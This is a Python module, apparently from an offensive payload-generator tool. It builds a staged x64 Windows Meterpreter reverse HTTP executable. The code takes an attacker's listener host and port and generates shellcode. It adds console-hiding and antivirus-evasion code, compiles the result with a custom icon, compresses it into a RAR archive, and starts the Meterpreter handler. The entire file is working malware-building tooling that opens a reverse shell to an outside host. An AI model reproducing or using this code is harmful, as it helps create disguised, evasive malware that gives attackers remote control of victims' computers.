from lib import evasion, core, gen, body



def Construction():

    ARCH = "x64"
    PROTOCOLE = "HTTP"
    TYPE = "Meterpreter"
    PLATFORM = "Windows"
    STAGED = "YES"

    RC_PAYLOAD = "windows/x64/meterpreter/reverse_http"

    print(core.amcolors.PURPLE + core.amcolors.PURPLE + "[STAGED] Payload x64 Meterpreter Reverse HTTP" + core.amcolors.ENDC)

    Gen_Payload = True

    while Gen_Payload:

        LHOST = gen.LHOST_Input()
        LPORT = gen.LPORT_Input()
        FILENAME = "output/" + gen.FILENAME_Input() + ".exe"

        print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Shellcode generation." + core.amcolors.ENDC)

        PAYLOAD = gen.Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT)

        Final_Code = body.Start()
        Final_Code += str(PAYLOAD)
        Final_Code += body.Hide_Window_Console()
        Final_Code += evasion.Decoil()
        Final_Code += body.End()

        with open('source.c', 'w') as f:
            f.write(Final_Code)

        ICON = gen.Add_Icon()

        print(core.amcolors.OCRA + core.amcolors.BOLD + "\n[*] Compiling + Stripping." + core.amcolors.ENDC)

        gen.Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON)

        gen.Compress_Rar(FILENAME)

        gen.Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE)

        print(core.amcolors.GREEN + core.amcolors.BOLD + "\n[+] Complete task." + core.amcolors.ENDC)
        print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Exiting script." + core.amcolors.ENDC)

        Gen_Payload = False
